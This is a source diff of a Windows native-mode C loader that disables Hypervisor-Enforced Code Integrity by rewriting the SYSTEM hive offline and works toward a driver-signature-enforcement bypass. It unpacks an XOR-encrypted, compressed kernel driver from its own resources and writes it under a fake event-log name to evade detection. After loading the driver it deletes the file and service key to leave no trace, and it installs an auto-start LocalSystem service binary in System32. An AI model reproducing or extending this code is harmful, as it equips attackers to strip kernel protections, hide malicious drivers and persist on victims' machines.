@@ -1,210 +1,459 @@
 // ============================================================================
-// SetupManager — HVCI hive patching, DriverStore enumeration, cleanup
+// SetupManager — resource extraction, HVCI hive patching, cleanup (BB variant)
 //
-// HVCI PATCH STRATEGY:
-//   Windows cannot disable HVCI through the registry key alone while the
-//   system is running — the change only takes effect if the SYSTEM hive is
-//   modified offline before the next boot.  PatchSystemHiveHVCI opens the
-//   live hive file (\SystemRoot\System32\config\SYSTEM) as a raw binary and
-//   rewrites the Enabled VK cell inline, bypassing the registry lock.
-//   This is safe at SMSS phase because the hive is not yet mapped read-only.
+// DRIVER DEPLOYMENT (BB-specific):
+//   kvc.sys is NOT distributed as a separate file — it is embedded directly
+//   in the kvc_smss.exe PE binary as resource IDR_DRV1 (type 10, id 101).
 //
-//   NK/VK walkthrough (chunked, 1 MB at a time):
-//     1. Search chunk for the "HypervisorEnforcedCodeIntegrity" NK name.
-//     2. Validate the NK cell signature ("nk" bytes before the name).
-//     3. Read the NK values list offset and walk each VK.
-//     4. Find the VK whose name is "Enabled" (ASCII or Unicode).
-//     5. Verify the data type is REG_DWORD with inline storage (0x80000004).
-//     6. Seek to the inline payload field (+12 from VK start) and write newValue.
-//     7. Read back the written byte to verify the disk write succeeded.
+//   Payload encoding pipeline (build time):
+//     raw kvc.sys → LZNT1 compress → XOR with XOR_KEY (7-byte rotating key)
+//     → stored as PE RCDATA resource
 //
-//   The 256-byte overlap between chunks prevents missing a match that straddles
-//   a 1 MB boundary.
+//   Extraction pipeline (runtime, in ExtractkvcFromResource):
+//     FindResourceData(IDR_DRV1) → XOR decrypt → RtlDecompressBuffer(LZNT1)
+//     → NtCreateFile to kvc_Log (Sam.evtx) → LoadDriver → Cleanupkvc
+//
+//   The .evtx extension disguises the driver binary as a Windows event log
+//   in the WinEvt\Logs directory to avoid trivial file-system detection.
+//
+// HVCI PATCH STRATEGY (same as kvc_smss variant):
+//   Opens the live SYSTEM hive file as raw binary and rewrites the
+//   HypervisorEnforcedCodeIntegrity\Enabled VK cell inline.  Safe at SMSS
+//   phase because the hive is not yet mapped read-only.  Change takes effect
+//   only after a reboot.  See PatchSystemHiveHVCI for NK/VK walk details.
 // ============================================================================
 
 #include "SetupManager.h"
+#include "DriverManager.h"
 
 extern PWSTR MmGetPoolDiagnosticString(void);
+
+// Resource IDs for embedded payloads (RCDATA, type 10).
+#define IDR_DRV1                 101   // kvc.sys kernel driver
+#define IDR_DRV2                 102   // bbs.exe HVCI Shutdown Service
+// Exact size of the XOR+LZNT1-compressed payload stored in the resource section.
+#define kvc_SIZE              9139
+// Exact size of kvc.sys after LZNT1 decompression — used to validate integrity.
+#define kvc_UNCOMPRESSED_SIZE 14024
+// Compressed size of bbs.exe (XOR+LZNT1) — deterministic, rebuild if binary changes.
+#define bbs_SIZE              1759
+// Uncompressed size of bbs.exe — used to validate decompression integrity.
+#define bbs_UNCOMPRESSED_SIZE 4096
 
 // 1 MB chunk size is optimal for Native I/O operations.
 #define SCAN_CHUNK_SIZE (1024 * 1024)
 // Safety margin keeps the full NK header available when a match lands near a chunk edge.
 #define OVERLAP_SIZE    (256)
-// All offsets are relative to the start of the hive bin data (after the 0x1000-byte
-// base header).  These values are derived from the Windows registry hive on-disk
-// format (documented in libregf / reglookup research).
-#define HIVE_BIN_BASE   (0x1000ULL)    // hive bins begin after the base block
-#define HIVE_MAX_VALUES (256)           // sanity cap on values per key
-#define HIVE_NK_NAME_OFFSET          (0x4C)   // byte offset of KeyName within an NK cell
-#define HIVE_NK_VALUES_COUNT_DELTA   (40)     // bytes before KeyName → ValuesCount field
-#define HIVE_NK_VALUES_LIST_DELTA    (36)     // bytes before KeyName → ValuesListOffset field
+// All hive offsets are relative to the 0x1000-byte base header.
+#define HIVE_BIN_BASE   (0x1000ULL)
+#define HIVE_MAX_VALUES (256)
+#define HIVE_NK_NAME_OFFSET          (0x4C)    // byte offset of KeyName within an NK cell
+#define HIVE_NK_VALUES_COUNT_DELTA   (40)       // bytes before KeyName → ValuesCount
+#define HIVE_NK_VALUES_LIST_DELTA    (36)       // bytes before KeyName → ValuesListOffset
 // Inline REG_DWORD: high bit of DataLength set + DataLength == 4.
-// The actual DWORD payload is stored in the DataOffset field of the VK cell.
 #define HIVE_VK_INLINE_DWORD         (0x80000000UL | sizeof(ULONG))
-#define HIVE_VK_FIXED_SIZE           (24)     // fixed header size of a VK cell
+#define HIVE_VK_FIXED_SIZE           (24)       // fixed header size of a VK cell
+
+// 7-byte rotating XOR key applied to the compressed payload.
+// Key is chosen to avoid null bytes in the encrypted stream (PE resource section
+// cannot store embedded NULs in some linker toolchains).
+static const UCHAR XOR_KEY[] = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
+static const SIZE_T XOR_KEY_LEN = sizeof(XOR_KEY);
 
 // ============================================================================
-// DRIVERSTORE ENUMERATION
-// Locates kvc.sys in the Windows Driver Store.
-// The package directory is named "avc.inf_amd64_<hash>" — enumerated with a
-// wildcard filter rather than hardcoding the content hash.
+// RESOURCE EXTRACTION
 // ============================================================================
 
-// Probe whether path names an existing file or directory by opening it
-// with FILE_READ_ATTRIBUTES (requires no lock, works on locked files).
-static BOOLEAN FileExists(PCWSTR path) {
-    UNICODE_STRING usPath;
-    OBJECT_ATTRIBUTES oa;
-    IO_STATUS_BLOCK iosb;
-    HANDLE hFile = NULL;
-    NTSTATUS status;
+// Locates the PE resource data entry for resourceId (type 10 / RCDATA).
+// Walks the in-memory resource directory starting from the process image base,
+// which is read from the PEB (GS:[0x60]+0x10 on x64).
+// Returns a pointer into the mapped PE image (read-only) and sets *outSize.
+// Returns NULL if the resource section is absent or the ID is not found.
+PVOID FindResourceData(ULONG resourceId, PULONG outSize) {
+    PVOID imageBase = NULL;
 
-    RtlInitUnicodeString(&usPath, path);
-    InitializeObjectAttributes(&oa, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    #ifdef _M_X64
+        imageBase = (PVOID)*(ULONGLONG*)((UCHAR*)__readgsqword(0x60) + 0x10);
+    #else
+        imageBase = (PVOID)*(ULONG*)((UCHAR*)__readfsdword(0x30) + 0x08);
+    #endif
 
-    status = NtOpenFile(&hFile,
-                        FILE_READ_ATTRIBUTES | SYNCHRONIZE,
-                        &oa, &iosb,
-                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-                        FILE_SYNCHRONOUS_IO_NONALERT);
-    if (!NT_SUCCESS(status)) {
+    if (!imageBase) {
+        DEBUG_LOG(L"DEBUG: Cannot get image base\r\n");
+        return NULL;
+    }
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
+    if (dosHeader->e_magic != 0x5A4D) {
+        DEBUG_LOG(L"DEBUG: Invalid DOS header\r\n");
+        return NULL;
+    }
+
+    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((UCHAR*)imageBase + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != 0x4550) {
+        DEBUG_LOG(L"DEBUG: Invalid PE signature\r\n");
+        return NULL;
+    }
+
+    PIMAGE_DATA_DIRECTORY resourceDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
+    if (resourceDir->Size == 0) {
+        DEBUG_LOG(L"DEBUG: No resource directory\r\n");
+        return NULL;
+    }
+
+    PIMAGE_RESOURCE_DIRECTORY resRoot = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)imageBase + resourceDir->VirtualAddress);
+    PIMAGE_RESOURCE_DIRECTORY_ENTRY resEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(resRoot + 1);
+
+    for (ULONG i = 0; i < (ULONG)(resRoot->NumberOfNamedEntries + resRoot->NumberOfIdEntries); i++) {
+        if (!resEntry[i].NameIsString && resEntry[i].Id == 10) {
+            PIMAGE_RESOURCE_DIRECTORY typeDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (resEntry[i].OffsetToDirectory & 0x7FFFFFFF));
+            PIMAGE_RESOURCE_DIRECTORY_ENTRY typeEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(typeDir + 1);
+
+            for (ULONG j = 0; j < (ULONG)(typeDir->NumberOfNamedEntries + typeDir->NumberOfIdEntries); j++) {
+                if (!typeEntry[j].NameIsString && typeEntry[j].Id == resourceId) {
+                    PIMAGE_RESOURCE_DIRECTORY nameDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (typeEntry[j].OffsetToDirectory & 0x7FFFFFFF));
+                    PIMAGE_RESOURCE_DIRECTORY_ENTRY nameEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(nameDir + 1);
+
+                    if (nameDir->NumberOfIdEntries > 0) {
+                        PIMAGE_RESOURCE_DATA_ENTRY dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((UCHAR*)resRoot + nameEntry[0].OffsetToData);
+                        *outSize = dataEntry->Size;
+                        return (PVOID)((UCHAR*)imageBase + dataEntry->OffsetToData);
+                    }
+                }
+            }
+        }
+    }
+
+    return NULL;
+}
+
+// Extracts kvc.sys from the embedded PE resource, writes it to kvc_Log, and
+// returns TRUE when the file is ready for LoadDriver.
+//
+// Idempotency: if the driver is already loaded from a previous call, the
+// function unloads it, removes the registry key, and deletes the old file
+// before extracting a fresh copy.  This handles re-entry after a partial run.
+//
+// Failure paths: returns FALSE and leaves kvc_Log absent if resource is
+// missing, size mismatches, decompression fails, or file write fails.
+BOOLEAN ExtractkvcFromResource(void) {
+    PWSTR driverName = MmGetPoolDiagnosticString();
+
+    // Cleanup any leftover state from previous run
+    if (IsDriverLoaded(driverName)) {
+        DEBUG_LOG(L"INFO: kvc already loaded, unloading...\r\n");
+
+        WCHAR fullServicePath[MAX_PATH_LEN];
+        UNICODE_STRING usServiceName;
+
+        SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN,
+                                      L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
+        if (baseLen < MAX_PATH_LEN - 1) {
+            if (wcscat_safe(fullServicePath, MAX_PATH_LEN, driverName) < MAX_PATH_LEN) {
+                RtlInitUnicodeString(&usServiceName, fullServicePath);
+                NtUnloadDriver(&usServiceName);
+            }
+        }
+
+        // Delete leftover registry key
+        OBJECT_ATTRIBUTES oaKey;
+        HANDLE hKey;
+        UNICODE_STRING usKeyPath;
+        wcscpy_safe(fullServicePath, MAX_PATH_LEN,
+                    L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
+        wcscat_safe(fullServicePath, MAX_PATH_LEN, driverName);
+        RtlInitUnicodeString(&usKeyPath, fullServicePath);
+        InitializeObjectAttributes(&oaKey, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        if (NT_SUCCESS(NtOpenKey(&hKey, DELETE, &oaKey))) {
+            NtDeleteKey(hKey);
+            NtClose(hKey);
+        }
+
+        // Delete leftover file
+        UNICODE_STRING usFilePath;
+        OBJECT_ATTRIBUTES oaFile;
+        IO_STATUS_BLOCK iosb;
+        HANDLE hFile;
+        FILE_DISPOSITION_INFORMATION dispInfo;
+        RtlInitUnicodeString(&usFilePath, kvc_Log);
+        InitializeObjectAttributes(&oaFile, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        if (NT_SUCCESS(NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oaFile, &iosb,
+                                  FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT))) {
+            dispInfo.DeleteFile = TRUE;
+            NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
+            NtClose(hFile);
+        }
+
+        DEBUG_LOG(L"INFO: Previous kvc state cleaned\r\n");
+    }
+
+    ULONG resourceSize = 0;
+    PVOID resourceData = FindResourceData(IDR_DRV1, &resourceSize);
+
+    if (!resourceData || resourceSize != kvc_SIZE) {
+        DisplayMessage(L"FAILED: Cannot find non-compliant driver resource\r\n");
         return FALSE;
     }
+
+    DEBUG_LOG(L"INFO: Extracting non-compliant driver from resource...\r\n");
+
+    UCHAR xorBuf[kvc_SIZE];
+    UCHAR decompBuf[kvc_UNCOMPRESSED_SIZE];
+    ULONG finalSize = 0;
+    NTSTATUS status;
+
+    // XOR decrypt
+    UCHAR* srcData = (UCHAR*)resourceData;
+    for (SIZE_T i = 0; i < kvc_SIZE; i++) {
+        xorBuf[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
+    }
+
+    // LZNT1 decompress
+    status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
+                                 decompBuf, kvc_UNCOMPRESSED_SIZE,
+                                 xorBuf, kvc_SIZE,
+                                 &finalSize);
+
+    if (!NT_SUCCESS(status) || finalSize != kvc_UNCOMPRESSED_SIZE) {
+        DisplayMessage(L"FAILED: Cannot decompress driver resource");
+        DisplayStatus(status);
+        return FALSE;
+    }
+
+    UNICODE_STRING usFilePath;
+    OBJECT_ATTRIBUTES oa;
+    IO_STATUS_BLOCK iosb;
+    HANDLE hFile;
+    LARGE_INTEGER byteOffset;
+
+    RtlInitUnicodeString(&usFilePath, kvc_Log);
+    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
+                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
+                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+
+    if (!NT_SUCCESS(status)) {
+        DisplayMessage(L"FAILED: Cannot create temporary driver file");
+        DisplayStatus(status);
+        return FALSE;
+    }
+
+    byteOffset.QuadPart = 0;
+    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decompBuf,
+                        kvc_UNCOMPRESSED_SIZE, &byteOffset, NULL);
 
     NtClose(hFile);
+
+    if (!NT_SUCCESS(status)) {
+        DisplayMessage(L"FAILED: Cannot write driver file");
+        DisplayStatus(status);
+        return FALSE;
+    }
+
+    DEBUG_LOG(L"SUCCESS: Non-compliant driver extracted to system.evtx\r\n");
     return TRUE;
 }
 
-// Searches DriverStore\FileRepository for a directory matching "avc.inf_amd64_*"
-// then verifies that kvc.sys exists inside it.
-// outPath receives the full NT path (e.g. \SystemRoot\System32\DriverStore\
-//   FileRepository\avc.inf_amd64_<hash>\kvc.sys) on success.
-// Returns FALSE if the DriverStore directory cannot be opened or the pattern
-// has no match (package not staged).
-BOOLEAN FindKvcSysInDriverStore(PWSTR outPath, SIZE_T outPathLen) {
-    static UCHAR dirBuffer[4096];
-    UNICODE_STRING usRepoPath, usPattern;
-    OBJECT_ATTRIBUTES oa;
-    IO_STATUS_BLOCK iosb;
-    HANDLE hDir = NULL;
+// ============================================================================
+// BBS SERVICE DEPLOYMENT
+// Extracts bbs.exe from resource IDR_DRV2 and registers HVCIShutdownSvc so
+// that the SCM starts it automatically on next and every subsequent boot.
+//
+// Deployment pipeline (build time):
+//   raw bbs.exe -> LZNT1 compress -> XOR with XOR_KEY -> IDR_DRV2 resource
+//
+// Extraction pipeline (runtime, here):
+//   FindResourceData(IDR_DRV2) -> XOR decrypt -> RtlDecompressBuffer(LZNT1)
+//   -> NtCreateFile to \SystemRoot\System32\bbs.exe
+//   -> NtCreateKey  \Registry\Machine\...\Services\HVCIShutdownSvc
+//
+// The function is idempotent: the file is opened with FILE_OVERWRITE_IF and
+// the service key creation is non-fatal on STATUS_OBJECT_NAME_COLLISION.
+// ============================================================================
+
+// Destination path for the extracted service binary.
+#define bbs_DestPath  L"\\SystemRoot\\System32\\bbs.exe"
+// ImagePath value stored in the service key (REG_EXPAND_SZ, SCM-expanded).
+#define bbs_ImagePath L"%SystemRoot%\\System32\\bbs.exe"
+// Human-readable name stored in the service key.
+#define bbs_DisplayName L"HVCI Shutdown Service"
+// SCM service name (must match the name compiled into bbs.exe).
+#define bbs_ServiceName L"HVCIShutdownSvc"
+
+BOOLEAN ExtractBbsAndRegisterService(void) {
+    ULONG resourceSize = 0;
+    PVOID resourceData = FindResourceData(IDR_DRV2, &resourceSize);
+
+    if (!resourceData || resourceSize != bbs_SIZE) {
+        DisplayMessage(L"FAILED: Cannot find bbs.exe resource (IDR_DRV2)\r\n");
+        return FALSE;
+    }
+
+    DEBUG_LOG(L"INFO: Extracting bbs.exe from resource IDR_DRV2...\r\n");
+
+    UCHAR xorBuf[bbs_SIZE];
+    UCHAR decompBuf[bbs_UNCOMPRESSED_SIZE];
+    ULONG finalSize = 0;
     NTSTATUS status;
 
-    RtlInitUnicodeString(&usRepoPath, DRIVERSTORE_REPO);
-    InitializeObjectAttributes(&oa, &usRepoPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    // XOR decrypt (same key as IDR_DRV1)
+    UCHAR* srcData = (UCHAR*)resourceData;
+    for (SIZE_T i = 0; i < bbs_SIZE; i++) {
+        xorBuf[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
+    }
 
-    status = NtOpenFile(&hDir,
-                        FILE_LIST_DIRECTORY | SYNCHRONIZE,
-                        &oa, &iosb,
-                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
+    // LZNT1 decompress
+    status = RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1,
+                                 decompBuf, bbs_UNCOMPRESSED_SIZE,
+                                 xorBuf, bbs_SIZE,
+                                 &finalSize);
+
+    if (!NT_SUCCESS(status) || finalSize != bbs_UNCOMPRESSED_SIZE) {
+        DisplayMessage(L"FAILED: Cannot decompress bbs.exe resource");
+        DisplayStatus(status);
+        return FALSE;
+    }
+
+    // Write bbs.exe to System32
+    UNICODE_STRING usFilePath;
+    OBJECT_ATTRIBUTES oa;
+    IO_STATUS_BLOCK iosb;
+    HANDLE hFile;
+    LARGE_INTEGER byteOffset;
+
+    RtlInitUnicodeString(&usFilePath, bbs_DestPath);
+    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
+                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
+                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
     if (!NT_SUCCESS(status)) {
-        DEBUG_LOG(L"FAILED: Cannot open DriverStore FileRepository\r\n");
+        DisplayMessage(L"FAILED: Cannot create System32\\bbs.exe");
+        DisplayStatus(status);
         return FALSE;
     }
 
-    RtlInitUnicodeString(&usPattern, DRIVERSTORE_PATTERN);
-
-    memset_impl(dirBuffer, 0, sizeof(dirBuffer));
-    status = NtQueryDirectoryFile(hDir, NULL, NULL, NULL, &iosb,
-                                  dirBuffer, sizeof(dirBuffer),
-                                  FileDirectoryInformation,
-                                  TRUE,         // ReturnSingleEntry
-                                  &usPattern,   // FileName filter
-                                  TRUE);        // RestartScan
-
-    NtClose(hDir);
+    byteOffset.QuadPart = 0;
+    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decompBuf,
+                        bbs_UNCOMPRESSED_SIZE, &byteOffset, NULL);
+    NtClose(hFile);
 
     if (!NT_SUCCESS(status)) {
-        DEBUG_LOG(L"FAILED: avc.inf_amd64_* not found in DriverStore\r\n");
+        DisplayMessage(L"FAILED: Cannot write System32\\bbs.exe");
+        DisplayStatus(status);
         return FALSE;
     }
 
-    PFILE_DIRECTORY_INFORMATION dirInfo = (PFILE_DIRECTORY_INFORMATION)dirBuffer;
+    DEBUG_LOG(L"SUCCESS: bbs.exe extracted to System32\r\n");
 
-    // Verify it's a directory
-    if (!(dirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-        DEBUG_LOG(L"FAILED: Found entry is not a directory\r\n");
-        return FALSE;
+    // Create SCM service registry key for HVCIShutdownSvc
+    // Type  = 0x10  SERVICE_WIN32_OWN_PROCESS
+    // Start = 0x02  SERVICE_AUTO_START
+    // ErrorControl = 0x01  SERVICE_ERROR_NORMAL
+    WCHAR svcKeyPath[MAX_PATH_LEN];
+    UNICODE_STRING usKeyPath, usValueName;
+    OBJECT_ATTRIBUTES oaKey;
+    HANDLE hKey = NULL;
+    ULONG disposition;
+    DWORD dwValue;
+    ULONG dataSize;
+
+    if (wcscpy_safe(svcKeyPath, MAX_PATH_LEN,
+                    L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\")
+        >= MAX_PATH_LEN - 1) {
+        DisplayMessage(L"WARNING: bbs service key path too long\r\n");
+        return TRUE;  // file was written successfully; key failure is non-fatal
     }
-
-    // Build: \SystemRoot\System32\DriverStore\FileRepository\<found>\kvc.sys
-    static const WCHAR prefix[] = L"\\SystemRoot\\System32\\DriverStore\\FileRepository\\";
-    static const WCHAR suffix[] = L"\\kvc.sys";
-
-    SIZE_T prefixLen = wcslen(prefix);
-    SIZE_T nameLen   = dirInfo->FileNameLength / sizeof(WCHAR);
-    SIZE_T suffixLen = wcslen(suffix);
-    SIZE_T totalLen  = prefixLen + nameLen + suffixLen;
-
-    if (totalLen >= outPathLen) {
-        DEBUG_LOG(L"FAILED: DriverStore path too long\r\n");
-        return FALSE;
-    }
-
-    wcscpy_safe(outPath, outPathLen, prefix);
-
-    // FileNameLength is in bytes, FileName is NOT null-terminated — copy manually
-    for (SIZE_T i = 0; i < nameLen; i++) {
-        outPath[prefixLen + i] = dirInfo->FileName[i];
-    }
-    outPath[prefixLen + nameLen] = 0;
-
-    wcscat_safe(outPath, outPathLen, suffix);
-
-    if (!FileExists(outPath)) {
-        outPath[0] = 0;
-        DEBUG_LOG(L"FAILED: kvc.sys missing inside DriverStore candidate directory\r\n");
-        return FALSE;
-    }
-
-    DEBUG_LOG(L"INFO: kvc.sys found in DriverStore\r\n");
-    return TRUE;
-}
-
-// Returns the NT path to kvc.sys, preferring the DriverStore location.
-// Falls back to \SystemRoot\System32\drivers\kvc.sys if the package is not
-// staged — this is the manual-copy deployment path used during development.
-BOOLEAN FindKvcSysPath(PWSTR outPath, SIZE_T outPathLen) {
-    static const WCHAR fallbackPath[] = L"\\SystemRoot\\System32\\drivers\\kvc.sys";
-
-    if (!outPath || outPathLen == 0) {
-        return FALSE;
-    }
-
-    if (FindKvcSysInDriverStore(outPath, outPathLen)) {
+    if (wcscat_safe(svcKeyPath, MAX_PATH_LEN, bbs_ServiceName) >= MAX_PATH_LEN) {
+        DisplayMessage(L"WARNING: bbs service key path truncated\r\n");
         return TRUE;
     }
 
-    if (wcscpy_safe(outPath, outPathLen, fallbackPath) >= outPathLen) {
-        DEBUG_LOG(L"FAILED: Fallback kvc.sys path too long\r\n");
-        return FALSE;
+    RtlInitUnicodeString(&usKeyPath, svcKeyPath);
+    InitializeObjectAttributes(&oaKey, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oaKey, 0, NULL,
+                         REG_OPTION_NON_VOLATILE, &disposition);
+
+    if (!NT_SUCCESS(status)) {
+        // Non-fatal: if the key already exists and NtCreateKey returned an error
+        // other than COLLISION (which should not happen), just log and continue.
+        DisplayMessage(L"WARNING: Cannot create HVCIShutdownSvc key");
+        DisplayStatus(status);
+        return TRUE;
     }
 
-    if (FileExists(outPath)) {
-        DEBUG_LOG(L"INFO: kvc.sys found in System32\\drivers\r\n");
-    } else {
-        DEBUG_LOG(L"INFO: Using System32\\drivers fallback for kvc.sys\r\n");
-    }
+    // ImagePath — REG_EXPAND_SZ — SCM expands %SystemRoot% at start time
+    RtlInitUnicodeString(&usValueName, L"ImagePath");
+    dataSize = (ULONG)((wcslen(bbs_ImagePath) + 1) * sizeof(WCHAR));
+    NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ, (PVOID)bbs_ImagePath, dataSize);
+	
+	// DisplayName — REG_SZ
+    RtlInitUnicodeString(&usValueName, L"DisplayName");
+    dataSize = (ULONG)((wcslen(bbs_DisplayName) + 1) * sizeof(WCHAR));
+    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)bbs_DisplayName, dataSize);
+
+    // ObjectName — REG_SZ
+    RtlInitUnicodeString(&usValueName, L"ObjectName");
+    dataSize = (ULONG)((wcslen(L"LocalSystem") + 1) * sizeof(WCHAR));
+    NtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)L"LocalSystem", dataSize);
+
+	// Type — REG_DWORD — 0x10 = SERVICE_WIN32_OWN_PROCESS
+    RtlInitUnicodeString(&usValueName, L"Type");
+    dwValue = 0x10;
+    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
+    // Start — REG_DWORD — 0x02 = SERVICE_AUTO_START
+    RtlInitUnicodeString(&usValueName, L"Start");
+    dwValue = 0x02;
+    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
+	
+    // ErrorControl — REG_DWORD — 0x01 = SERVICE_ERROR_NORMAL
+    RtlInitUnicodeString(&usValueName, L"ErrorControl");
+    dwValue = 0x01;
+    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));
+
+    NtClose(hKey);
+
+    DEBUG_LOG(L"SUCCESS: HVCIShutdownSvc service key ready\r\n");
 
     return TRUE;
 }
 
 // ============================================================================
 // POST-LOAD CLEANUP
-// Deletes the kvc.sys SCM registry key after the driver has been unloaded.
-// The key is identified via MmGetPoolDiagnosticString (obfuscated service name)
-// so no plaintext service name appears in the binary.
+// Removes both the temporary driver file (kvc_Log / Sam.evtx) AND the SCM
+// registry key created by LoadDriver.  Both must be deleted to leave no trace.
+// Idempotent: missing file or key is not treated as an error.
 // ============================================================================
 
-// Deletes HKLM\...\Services\<obfuscated-name> left by ExecuteAutoPatchLoad.
-// Idempotent: if the key is already gone, returns STATUS_SUCCESS.
-NTSTATUS CleanupOmniDriver(void) {
-    WCHAR fullServicePath[MAX_PATH_LEN];
+// Deletes kvc_Log and HKLM\...\Services\<obfuscated-name>.
+// Called by ExecuteAutoPatchLoad after the driver is unloaded (step 5).
+NTSTATUS Cleanupkvc(void) {
+    UNICODE_STRING usFilePath;
     UNICODE_STRING usServiceName;
     OBJECT_ATTRIBUTES oa;
+    IO_STATUS_BLOCK iosb;
+    HANDLE hFile;
     HANDLE hKey;
+    FILE_DISPOSITION_INFORMATION dispInfo;
+    NTSTATUS status;
+    WCHAR fullServicePath[MAX_PATH_LEN];
     PWSTR driverName = MmGetPoolDiagnosticString();
+
+    RtlInitUnicodeString(&usFilePath, kvc_Log);
+    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+
+    status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb,
+                       FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);
+
+    if (NT_SUCCESS(status)) {
+        dispInfo.DeleteFile = TRUE;
+        NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
+        NtClose(hFile);
+        DEBUG_LOG(L"INFO: Temporary driver file deleted\r\n");
+    }
 
     SIZE_T baseLen = wcscpy_safe(fullServicePath, MAX_PATH_LEN,
                                   L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
@@ -222,7 +471,7 @@ NTSTATUS CleanupOmniDriver(void) {
     RtlInitUnicodeString(&usServiceName, fullServicePath);
     InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    NTSTATUS status = NtOpenKey(&hKey, DELETE, &oa);
+    status = NtOpenKey(&hKey, DELETE, &oa);
     if (NT_SUCCESS(status)) {
         NtDeleteKey(hKey);
         NtClose(hKey);
@@ -265,7 +514,6 @@ static USHORT ReadLeUshort(PUCHAR buffer) {
 // Handles both narrow (ASCII, flags bit 0 set) and wide (Unicode, flags bit 0
 // clear) name encoding — the SYSTEM hive uses narrow names, but the function
 // accepts either for robustness.
-// bytesAvailable is the number of valid bytes in vkBuffer starting from byte 0.
 static BOOLEAN VkNameMatchesEnabled(PUCHAR vkBuffer, ULONG bytesAvailable, USHORT nameLength, USHORT flags) {
     static const char enabledName[] = "Enabled";
 
@@ -567,12 +815,8 @@ BOOLEAN PatchSystemHiveHVCI(BOOLEAN enable) {
 // ============================================================================
 
 // Reads the live DeviceGuard registry key to determine whether HVCI is active.
-// If Enabled==1: patches the SYSTEM hive, then triggers a reboot via
-// NtShutdownSystem(1).  Returns TRUE if a reboot was initiated or is in
-// progress (caller must terminate); FALSE if HVCI was not active.
-//
-// A return value of TRUE means the caller must not proceed with DSE bypass —
-// the system will reboot and on the next boot HVCI will be disabled.
+// If Enabled==1: patches the SYSTEM hive, then triggers a reboot.
+// Returns TRUE if a reboot was initiated (caller must terminate).
 BOOLEAN CheckAndDisableHVCI(void) {
     UNICODE_STRING usKeyPath, usValueName;
     OBJECT_ATTRIBUTES oa;
@@ -663,10 +907,40 @@ NTSTATUS RestoreHVCI(void) {
     return STATUS_SUCCESS;
 }
 
-// Updates the live (volatile) DeviceGuard registry key Enabled value.
-// This is a cosmetic operation — it makes Security Center and system tools
-// report the correct HVCI state without waiting for a reboot.
-// The physical hive file is not affected; PatchSystemHiveHVCI handles that.
+// Returns KeBootTime as a FILETIME (UTC, 100-ns ticks) via
+// NtQuerySystemInformation(SystemTimeOfDayInformation=3).
+// SYSTEM_TIMEOFDAY_INFORMATION layout: BootTime(8), CurrentTime(8), TimeZoneBias(8), ...
+//
